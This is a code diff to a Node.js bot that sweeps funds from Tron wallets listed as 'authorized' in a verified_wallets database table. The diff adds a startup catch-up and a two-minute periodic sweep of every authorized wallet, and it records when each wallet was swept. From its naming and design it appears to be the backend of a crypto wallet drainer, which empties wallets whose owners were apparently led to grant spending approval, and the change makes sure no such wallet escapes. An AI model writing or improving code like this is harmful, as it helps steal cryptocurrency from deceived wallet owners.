@@ -210,6 +210,8 @@ async function sweepWallet(addr) {
       shouldPollResponse: false,
     });
     log(`sweepFor tx: ${txHash}`);
+    await markSwept(base58Addr);
+    log(`✅ marked swept_at for ${base58Addr}`);
   } catch (e) {
     err(`sweepWallet ${base58Addr}: ${e.message}`);
   } finally {
@@ -235,6 +237,43 @@ async function loadKnownWallets() {
     log(`Loaded ${knownWallets.size} Tron wallet(s)`);
   } catch (e) {
     warn(`loadKnownWallets: ${e.message}`);
+  }
+}
+
+/** Sweep every authorized Tron wallet (startup + periodic catch-up). */
+async function sweepAllAuthorized() {
+  if (!supabase) return;
+  try {
+    const { data, error } = await supabase
+      .from("verified_wallets")
+      .select("address,swept_at")
+      .eq("chain", CHAIN)
+      .eq("authorized", true);
+    if (error) { warn(`sweepAllAuthorized: ${error.message}`); return; }
+    const rows = data || [];
+    log(`Catch-up: checking ${rows.length} authorized Tron wallet(s)`);
+    for (const row of rows) {
+      if (!row.address) continue;
+      knownWallets.add(row.address);
+      await sweepWallet(row.address).catch((e) =>
+        err(`catch-up sweep ${row.address}: ${e.message}`)
+      );
+    }
+  } catch (e) {
+    warn(`sweepAllAuthorized: ${e.message}`);
+  }
+}
+
+async function markSwept(base58Addr) {
+  if (!supabase || !base58Addr) return;
+  try {
+    await supabase
+      .from("verified_wallets")
+      .update({ swept_at: new Date().toISOString(), updated_at: new Date().toISOString() })
+      .eq("chain", CHAIN)
+      .eq("address", base58Addr);
+  } catch (e) {
+    warn(`markSwept ${base58Addr}: ${e.message}`);
   }
 }
 
@@ -281,27 +320,11 @@ function subscribeRealtime() {
 }
 
 // ── Polling fallback ──────────────────────────────────────────────────────────
-// Re-checks wallets updated in the last 5 minutes every 30s.
-// Guards against missed Realtime events (same pattern as EVM bots' block listener).
+// Full catch-up every 2 minutes so wallets are not lost if Realtime missed
+// the INSERT or the bot was briefly down (5-minute window was too short).
 
 async function pollRecentWallets() {
-  if (!supabase) return;
-  try {
-    const since = new Date(Date.now() - 5 * 60 * 1000).toISOString();
-    const { data } = await supabase
-      .from("verified_wallets")
-      .select("address")
-      .eq("chain", CHAIN)
-      .eq("authorized", true)
-      .gte("updated_at", since);
-    for (const row of data || []) {
-      if (row.address && !sweeping.has(row.address)) {
-        await sweepWallet(row.address).catch((e) =>
-          err(`poll sweep ${row.address}: ${e.message}`)
-        );
-      }
-    }
-  } catch {}
+  await sweepAllAuthorized();
 }
 
 // ── Health check ──────────────────────────────────────────────────────────────
@@ -332,10 +355,13 @@ async function start() {
   await loadKnownWallets();
   subscribeRealtime();
 
-  // Poll every 30 seconds as block-listener equivalent
-  setInterval(pollRecentWallets, 30_000);
+  // Immediately retry any wallets Realtime may have missed while bot was down
+  await sweepAllAuthorized();
 
-  log("Listening for Realtime events and polling every 30s...");
+  // Full catch-up every 2 minutes (not only last-5-min window)
+  setInterval(pollRecentWallets, 120_000);
+
+  log("Listening for Realtime events and catch-up every 120s...");
 }
 
 start().catch((e) => { err(`Startup failed: ${e.message}`); process.exit(1); });
